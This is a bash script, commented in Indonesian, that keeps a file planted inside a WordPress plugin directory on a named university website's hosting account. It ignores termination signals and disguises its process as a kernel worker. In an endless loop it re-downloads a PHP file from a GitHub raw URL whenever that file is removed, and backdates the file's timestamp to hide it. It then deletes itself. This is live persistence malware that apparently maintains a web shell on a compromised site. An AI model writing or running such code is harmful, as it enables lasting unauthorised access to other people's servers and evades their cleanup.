#!/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DIR="	/home/u782030068/domains/dypcoei.edu.in/public_html/wp-content/plugins/betterdocs/includes/elementor/widgets"
file_name="$DIR/betterdocs-elementor-function.php"
url="https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/simple2.php"
timestamp="201201081531.12"

# Mengabaikan sinyal agar tetap berjalan di background
trap '' 1 2 15

self_delete() {
    rm -f "$0" 2>/dev/null
}

daemonize() {
    (
        # Menyamarkan nama proses
        echo -ne "[kworker/u16:2]\x00" > /proc/self/comm 2>/dev/null
        
        while true; do
            if [ ! -f "$file_name" ]; then
                curl -sL "$url" -o "$file_name"
            fi
            chmod 0644 "$file_name" 2>/dev/null
            touch -t "$timestamp" "$file_name" 2>/dev/null
            
            # Loop pengecekan setiap detik selama 30 detik
            for ((i=0; i<30; i++)); do
                if [ ! -f "$file_name" ]; then
                    curl -sL "$url" -o "$file_name"
                    chmod 0644 "$file_name"
                    touch -t "$timestamp" "$file_name"
                fi
                sleep 1
            done
        done
    ) &
}

daemonize
sleep 1
self_delete
exit 0
